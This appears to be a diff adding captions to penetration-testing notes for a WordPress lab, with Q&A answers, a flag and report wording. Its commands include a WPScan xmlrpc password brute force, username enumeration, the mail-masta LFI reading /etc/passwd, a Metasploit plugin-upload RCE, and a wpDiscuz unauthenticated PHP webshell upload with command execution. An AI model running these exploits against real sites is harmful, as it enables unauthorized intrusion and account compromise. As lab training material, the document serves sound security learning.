@@ -28,6 +28,7 @@ wpscan --url http://target \
        -U doug \
        -P /usr/share/wordlists/rockyou.txt
 ```
+> Brute-forces a known user's password via the xmlrpc endpoint; swap `target`, the `-U` user, and the wordlist.
 
 ### Recognizing usernames first
 - `/?author=N` → 200 with `<title>` containing user display name; 404 if no user
@@ -40,6 +41,7 @@ curl -sk "http://target/?author=2" | grep -oE 'author-[a-z0-9]+|title>[^<]+'
 # author-doug
 # title>Doug Douglas …
 ```
+> Reveals a username from the `?author=N` page body (author CSS class / title); swap `target` and the author ID.
 
 ---
 
@@ -83,6 +85,7 @@ set vhost blog.inlanefreight.local
 set lhost tun0
 exploit
 ```
+> Uploads a malicious plugin via valid admin creds for RCE; swap username, password, rhost, vhost, and lhost.
 
 Cleanup is automatic but **always verify** — list it as an artifact in your report regardless.
 
@@ -95,6 +98,7 @@ LFI via the `pl` parameter in `count_of_send.php` — **unauthenticated**.
 ```bash
 curl -sk "http://target/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
 ```
+> Exploits the mail-masta LFI to read an arbitrary file (CVE-2016-1000127); swap `target` and the `pl=` path.
 
 Reads any file the web user can read. Combined with `/etc/passwd` shell parsing, identifies real-user accounts:
 ```bash
@@ -103,6 +107,7 @@ curl -sk "http://target/wp-content/plugins/mail-masta/inc/campaign/count_of_send
 # ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
 # webadmin:x:1001:1001::/home/webadmin:/bin/bash   ← non-default user
 ```
+> Uses the LFI to dump `/etc/passwd` and filter shell users for valid accounts; swap `target` for the host.
 
 Also vulnerable to SQL injection in the same plugin.
 
@@ -124,6 +129,7 @@ The plugin only intended to allow image attachments. Mime type detection can be 
 curl -sk "http://target/?p=1" | grep -oE 'wmuSecurity":"[a-f0-9]+"'
 # wmuSecurity":"6651bf63da"
 ```
+> Scrapes the wpDiscuz `wmuSecurity` nonce needed for the unauth upload; swap `target` and the post ID.
 
 **Step 2 — POST the malicious upload:**
 ```bash
@@ -164,6 +170,7 @@ curl -sk -X POST -H "X-Requested-With: XMLHttpRequest" \
      --data-binary @/tmp/wpd_payload \
      "http://target/wp-admin/admin-ajax.php"
 ```
+> Builds and POSTs the wpDiscuz multipart payload to upload a PHP webshell (CVE-2020-24186); swap `NONCE` and `target`.
 
 **Step 3 — extract uploaded URL from JSON response:**
 ```json
@@ -177,6 +184,7 @@ curl -sk "$SHELL?cmd=id"
 # GIF89a
 # uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+> Executes commands through the uploaded webshell via the `cmd` parameter; swap the `SHELL` URL and command.
 
 The `GIF89a` echoes back because it's still in the file. Strip with `grep -v GIF` if scripting.
 
@@ -185,6 +193,7 @@ The `GIF89a` echoes back because it's still in the file. Strip with `grep -v GIF
 curl -sk "$SHELL?cmd=rm%20\$(echo%20$SHELL%20|%20sed%20's|.*wp-content|/var/www/blog.inlanefreight.local/wp-content|')"
 # Or fetch full path with realpath and rm explicitly
 ```
+> Deletes the uploaded shell via itself to clean up; swap the `SHELL` URL and webroot path.
 
 ---
 
@@ -195,6 +204,7 @@ curl -sk "$SHELL?cmd=rm%20\$(echo%20$SHELL%20|%20sed%20's|.*wp-content|/var/www/
 curl -sk "http://blog.inlanefreight.local/?author=2" | grep -oE 'author-[a-z0-9]+'
 # author-doug
 ```
+> Enumerates a second username from the `?author=2` page; swap the host and author ID.
 **Answer:** `doug`
 
 ### Q2 — Doug's password (brute force)
@@ -205,6 +215,7 @@ wpscan --password-attack xmlrpc -t 20 \
        --url http://blog.inlanefreight.local
 # [SUCCESS] - doug / jessica1
 ```
+> Cracks doug's password via xmlrpc brute force; swap the `-U` user, wordlist, and `--url` host.
 **Answer:** `jessica1`
 
 Took ~22 seconds. xmlrpc multicall lets WPScan batch ~5 guesses per request.
@@ -216,6 +227,7 @@ curl -sk "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/camp
 # ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
 # webadmin:x:1001:1001::/home/webadmin:/bin/bash
 ```
+> Reads `/etc/passwd` via the mail-masta LFI to find shell users; swap the host and `pl=` path.
 **Answer:** `webadmin`
 
 ### Q4 — Flag in webroot
@@ -240,6 +252,7 @@ curl -sk "$SHELL?cmd=ls%20-la%20/var/www/blog.inlanefreight.local/" | grep flag
 
 curl -sk "$SHELL?cmd=cat%20/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt"
 ```
+> Full wpDiscuz unauth-upload chain: grab nonce, POST shell, then read the webroot flag; swap `URL` and the flag path.
 **Answer:** `l00k_ma_unAuth_rc3!`
 
 Note the **vhost-based webroot**: `/var/www/blog.inlanefreight.local/` (not `/var/www/html/`). Each vhost has its own webroot in this lab setup.
@@ -249,6 +262,7 @@ Note the **vhost-based webroot**: `/var/www/blog.inlanefreight.local/` (not `/va
 curl -sk "$SHELL?cmd=rm%20/var/www/blog.inlanefreight.local/wp-content/uploads/2026/05/shell-1778774745.5047.php"
 curl -sk -o /dev/null -w "%{http_code}\n" "$SHELL"   # 404 confirms deletion
 ```
+> Removes the uploaded shell and verifies a 404; swap the `SHELL` URL and absolute file path.
 
 Add to report appendix: *"Uploaded `shell-1778774745.5047.php` via wpDiscuz CVE-2020-24186; removed after exploitation. Verified 404."*
 
